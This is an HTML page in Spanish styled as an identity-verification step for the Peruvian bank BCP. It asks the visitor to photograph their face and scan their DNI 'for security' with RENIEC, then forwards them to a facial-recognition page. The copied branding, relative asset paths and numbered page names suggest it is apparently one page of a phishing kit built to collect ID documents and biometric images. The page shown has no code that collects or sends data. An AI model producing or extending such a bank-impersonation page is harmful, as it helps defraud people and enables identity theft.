<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Escaneo de DNI - BCP</title>
  <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700&display=swap" rel="stylesheet">
  <style>
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
      font-family: 'Roboto', sans-serif;
    }

    body {
      background-color: #ffffff;
      min-height: 100vh;
      display: flex;
      flex-direction: column;
      align-items: center;
    }

    .header {
      width: 100%;
      background-color: #002f87;
      padding: 15px 20px;
      display: flex;
      align-items: center;
    }

    .header img {
      height: 24px;
    }

    .volver {
      width: 100%;
      max-width: 400px;
      margin-top: 20px;
      padding-left: 20px;
      font-size: 14px;
      color: #ff6f00;
      display: flex;
      align-items: center;
      cursor: pointer;
      font-weight: 600; /* <- más grueso */
    }

    .volver::before {
      content: "←";
      margin-right: 6px;
    }

    .container {
      width: 100%;
      max-width: 400px;
      padding: 30px 20px;
      background-color: #ffffff;
      margin-top: 20px;
      text-align: center;
      border-radius: 10px;
    }

    .titulo {
      font-size: 20px;
      color: #002f87;
      font-weight: 700;
      margin-bottom: 10px;
      line-height: 28px;
    }

    .subtitulo {
      font-size: 14px;
      color: #5f5f5f;
      margin-bottom: 30px;
    }

    .subtitulo b {
      color: #002f87;
    }

    .imagen-dni {
      width: 280px;
      height: auto;
      margin-bottom: 30px;
    }

    .checkbox-group {
      display: flex;
      align-items: flex-start;
      justify-content: flex-start;
      margin-bottom: 30px;
      padding: 0 10px;
    }

    .checkbox-group input[type="checkbox"] {
      margin-top: 2px;
      accent-color: #ff7800;
    }

    .checkbox-group label {
      font-size: 14px;
      color: #333;
      margin-left: 10px;
      text-align: left;
    }

    .checkbox-group label span {
      color: #d8781b;
    }

    .btn-continuar {
      background-color: #ff7800;
      color: white;
      border: none;
      border-radius: 30px;
      padding: 12px;
      font-size: 15px;
      width: 90%;
      margin: 0 auto;
      cursor: pointer;
    }

    .btn-continuar:disabled {
      background-color: #ccc;
      cursor: not-allowed;
    }
  </style>
</head>
<body>
  <div class="header">
    <img src="pe/images/dark-default.svg" alt="BCP logo">
  </div>

  <div class="volver" onclick="history.back()">Volver</div>

  <div class="container">
    <div class="titulo">Tómate una foto y<br>escanea tu DNI</div>
    <div class="subtitulo">Por tu <b>seguridad</b>, lo validaremos con RENIEC.</div>

    <img src="pe/images/flotante.png" alt="Escaneo DNI" class="imagen-dni">

    <div class="checkbox-group">
      <input type="checkbox" id="acepto">
      <label for="acepto">He leído y acepto el <span>Tratamiento de datos personales.</span></label>
    </div>

    <button class="btn-continuar" id="btnContinuar" disabled>Continuar</button>
  </div>

  <script>
    const check = document.getElementById('acepto');
    const btn = document.getElementById('btnContinuar');

    check.addEventListener('change', () => {
      btn.disabled = !check.checked;
    });

    btn.addEventListener('click', () => {
      window.location.href = "reconocimiento-facial2.html";
    });
  </script>
</body>
</html>
